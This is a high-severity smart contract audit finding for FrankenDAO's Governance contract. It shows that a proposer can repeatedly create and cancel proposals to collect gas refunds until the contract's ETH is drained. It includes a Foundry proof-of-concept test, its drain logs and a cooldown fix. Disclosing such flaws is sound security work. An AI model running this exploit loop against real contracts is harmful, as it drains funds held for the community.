ElKu

high

# ETH balance of Governance contract can be completely drained by a malicious user

## Summary

The funds(eth) in [Governance](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol) contract can be completely drained by a malicious user who is ready to sacrifice a small amount of his own eth.

## Vulnerability Detail

When creating a proposal using the [proposal](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol#L337) function in `Governance` contract, if the `proposalRefund` is true, a refund is issued to the proposer on successful creation of the proposal. 

This created proposal can be immediately cancelled by the user and the proposal function can be called by the user again. The proposal is created successfully again and user gets a refund. Although each time the user still loses some eth, its a very a tiny amount and the majority of the gas he spends, he gets it back from the contract.

A malicious user can do this proposal creation-cancellation cycle multiple times in a single block to continossuly drain the contract funds. Even though he doesnt gain any money from it, he can do the damage to the community. 

The POC I used for testing is shared below:

The outputs displayed by the logs were like this:

```bash
[PASS] testElku3Proposals() (gas: 178045886)
Logs:
  Starting Gov contract eth: 5.000000000000000000
  Starting user balance eth: 0.006875970870244846
  Number of proposal rounds(create-cancel) for draining the contract: 625
  Total gas used by user: 202203880
  Total eth spent by the user: 5.055097000000000000
  Final user balance eth: -0.055097000000000000
```

We can see that the user called the proposal creation-cancellation cycle 625 times and drained the whole 5 eth available in the contract. While doing so he spent `5.055097 eth` as gas fees, but then the governance contract had sent him `5 eth` as refund. So he lost only `0.055097 eth` while doing tremendous damage to the protocol.

## Impact

Any user who has staked in the Staking contract can completely drain the Governance contract eth balance, by spending a small amount of his own eth.

## Code Snippet
The POC used for testing:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { GovernanceBase } from "../bases/GovernanceBase.t.sol";
import { IGovernance } from "../../src/interfaces/IGovernance.sol";

contract ActiveProposalTestByElku is GovernanceBase {

    function testElku3Proposals() public {
        uint proposalId;
        uint bal;
        uint userGasUsed;
        uint startGas;
        uint i;
        int userBalance;
        int usedGas;
        emit log_named_decimal_uint("Starting Gov contract eth",address(gov).balance,18);
        emit log_named_decimal_int("Starting user balance eth",(userBalance = int(proposer.balance)),18);
        // create and cancel proposal continously until contract funds are drained.
        for(; i < 100000; i++) {
            startGas = gasleft();
            proposalId = _createProposal();
            userGasUsed += startGas - gasleft();  //add how much user spend creating a proposal
            vm.prank(proposer);
            startGas = gasleft();
            gov.cancel(proposalId);   
            userGasUsed += startGas - gasleft();   //add how much user spend cancelling the proposal
            bal = address(gov).balance;
            if(bal == 0) break;  //gov contract successfully drained
        }   
        emit log_named_uint("Number of proposal rounds(create-cancel) for draining the contract",i);
        emit log_named_uint("Total gas used by user",userGasUsed);
        emit log_named_decimal_int("Total eth spent by the user",(usedGas = int(userGasUsed*tx.gasprice)),18);
        emit log_named_decimal_int("Final user balance eth",(int(proposer.balance) - userBalance - usedGas),18);
    }
}
```

## Tool used

VSCode, Foundry, Manual Analysis

## Recommendation

Staking contract has a limit of one refund per day for staking and delegating. Such a limit could be introduced in proposal creation as well for refund.

Basically something like this:

```solidity
if (proposalRefund && lastProposalRefund[msg.sender] + refundCooldown <= block.timestamp) {
    uint256 startGas = gasleft();
    proposalId = _propose(_targets, _values, _signatures, _calldatas, _description);
    _refundGas(startGas);
    lastProposalRefund[msg.sender] = block.timestamp;
} else {
    proposalId = _propose(_targets, _values, _signatures, _calldatas, _description);
}
```
